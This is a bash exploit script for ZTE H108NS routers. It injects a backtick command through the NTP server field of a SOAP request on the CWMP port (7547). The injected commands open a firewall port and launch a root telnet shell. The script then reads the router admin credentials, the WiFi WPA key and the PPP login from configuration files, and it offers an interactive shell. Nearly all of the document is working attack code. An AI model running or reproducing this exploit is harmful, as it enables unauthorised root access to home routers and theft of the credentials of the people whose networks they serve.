#!/bin/bash
#ZTE h108ns reverse shell exploit
#Exploit creates a reverse telnet shell on target with root access
#Tested on latest OTE firmware "H108NSV1.1.7u_ZRD_GR2_A68"
#Konstantinos Nikas 2016

routerIP='192.168.1.1'
cwmpURI='/UD/act?1'
cwmpPort='7547'
exploitPort='9191'


xmlFile='/tmp/soapRequest.xml'
curlTimeout=10
telnetExist=$(which telnet)



function printout {
	echo "$1"
}


function logo {
	clear
	printout '| ==================\\ //===================================== |'
	printout '| ZTE        ___     \\/       ___     //  ___     (,) __  ___ |'
	printout '| H108NS    //___) ) //\     //   ) ) // //   ) ) / /   / /    |'
	printout '| REVERSE  //       // \\   //___/ / // //   / / / /   / /     |'
	printout '| SHELL   ((____   //   \\ //       // ((___/ / / /   / /      |'
	printout '| ============================================= zhrs-r260820 = |'
	printout
	printout
}
function createXML {
	echo '<?xml version="1.0"?>'>$xmlFile
	echo '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'>>$xmlFile
	echo '<SOAP-ENV:Body>'>>$xmlFile
	echo '<u:SetNTPServers xmlns:u="urn:dslforum-org:service:Time:1">'>>$xmlFile
	echo '<NewNTPServer1>`'$1'`</NewNTPServer1>'>>$xmlFile
	echo '<NewNTPServer2></NewNTPServer2>'>>$xmlFile
	echo '<NewNTPServer3></NewNTPServer3>'>>$xmlFile
	echo '<NewNTPServer4></NewNTPServer4>'>>$xmlFile
	echo '<NewNTPServer5></NewNTPServer5>'>>$xmlFile
	echo '</u:SetNTPServers>'>>$xmlFile
	echo '</SOAP-ENV:Body>'>>$xmlFile
	echo '</SOAP-ENV:Envelope>'>>$xmlFile

}
function pausescript {
	read entervalue || continue
}
function runCommand {
	createXML "$1"
	curl -H "Content-Type: text/xml; charset=utf-8" -H 'SOAPACTION: "urn:dslforum-org:service:Time:1#SetNTPServers"' -d @$xmlFile -X POST "http://$routerIP:$cwmpPort$cwmpURI" --connect-timeout $curlTimeout -s --output /dev/null
	if [[ $? -gt 0 ]]; then
		printout "   --> SOAP Request Error"
		printout "   --> Exploit FAILED."
		rm $xmlFile
		printout
		printout
		exit 2
	fi
	rm $xmlFile
}
function openTelnet {
	printout "   --> Connecting to reversed shell telnet server"
	osascript -e "tell application \"Terminal\" to do script \"telnet $routerIP $exploitPort\"" > /dev/null
	printout
	printout "      *** Press any key to kill telnet server on target ***"
	pausescript
}
function checkRouter {
	printout " #Checking connection with target router ($routerIP)"
	ping $routerIP -c 1 > /dev/null
	if [ $? -eq 0 ]; then 
		printout "   --> Router accessible!"
		printout 
		printout " #Checking CWMP access"
		runCommand "sleep 1"
	else
		printout "   --> FAILED: Router not accessible!"
		exit 1
	fi
	printout "   --> CWMP accessible!"
	printout
	
}

function runTelnetCommand {
	(echo " " ; (
	    echo unset echo
	    echo open "$routerIP $exploitPort"
	    sleep 1
	    echo "$1"
	    sleep 2
	    echo "exit"
	    ) | telnet 2>/dev/null | sed -n 6p ) > /tmp/output.txt 
	output=$(sed -n 2p /tmp/output.txt)
	rm /tmp/output.txt
	echo  '   --> '$output
}
function exploit {
	checkRouter
	printout " #Exploiting target router"
	printout "   --> Opening port $exploitPort on target"
	runCommand "iptables -I INPUT -p tcp --dport $exploitPort -j ACCEPT"
	printout "   --> Starting telnet reverse shell on port $exploitPort"
	runCommand "/usr/bin/utelnetd -d -p$exploitPort -l /bin/sh"
	printout
	printout " #Getting router username/password:"
	runTelnetCommand "cat /userfs/romfile.cfg | grep user"
	printout
	printout " #Getting WiFi password:"
	runTelnetCommand "cat /etc/Wireless/RT2860AP/RT2860AP.dat | grep WPAPSK="
	printout
	printout " #Getting PPP Username and Password:"
	runTelnetCommand "cat /etc/isp0.conf | grep USER"
	runTelnetCommand "cat /etc/isp0.conf | grep PASS"
	printout
	
	while true; do
	    read -p ' # Open shell on target (y/n)? : ' yn
	    case $yn in
	        [Yy]* ) openTelnet; break;;
	        [Nn]* ) printout; break;;
	        * ) echo "  --> Please answer yes or no.";;
	    esac
	done
	printout " # Killing telnet server on target"
	runCommand "killall utelnetd"
	printout "   --> Success!"
	printout 
	printout " # Exploit success!"
	printout
	printout
}

function installTelnet {
	brewExist=$(which brew)
	if [ $? -gt 0 ];then
		printout "  --> Homebrew not found!"
		printout "  --> Installing Homebrew..."
		/usr/bin/ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"
	fi
	printout "  --> Installing telnet via brew..."
	brew install telnet
	printout
	printout
	printout "      *** Please run zhrs again ***"
}

function checkTelnet {
	telnetExist=$(which telnet)
	if [ $? -gt 0 ];then
		printout "# Error - Telnet not found"
		while true; do
		    read -p '  --> Install telnet (y/n)? : ' yn
		    case $yn in
		        [Yy]* ) installTelnet; break;;
		        [Nn]* ) printout; exit; break;;
		        * ) echo "   --> Please answer yes or no.";;
		    esac
		done
		printout
		exit 1
	fi
}
logo
checkTelnet
exploit